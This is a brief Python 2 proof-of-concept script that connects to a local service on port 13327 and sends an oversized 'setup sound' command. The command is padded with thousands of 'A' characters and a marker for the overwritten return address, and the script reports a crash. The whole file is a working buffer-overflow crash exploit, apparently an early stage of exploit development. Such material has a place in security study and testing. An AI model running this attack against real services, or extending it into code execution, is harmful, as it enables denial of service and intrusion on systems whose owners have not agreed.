import socket

host = '127.0.0.1'
port = 13327

payload = "A"*4368 + "B"*4 +"C"*7

buffer = "\x11(setup sound " + payload + "\x90\x00#"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print 'connecting...'
s.connect((host, port))
print s.recv(1024)
print 'sending buffer...'
s.send(buffer)
print s.recv(1024)
s.close()
print 'CRASH!'
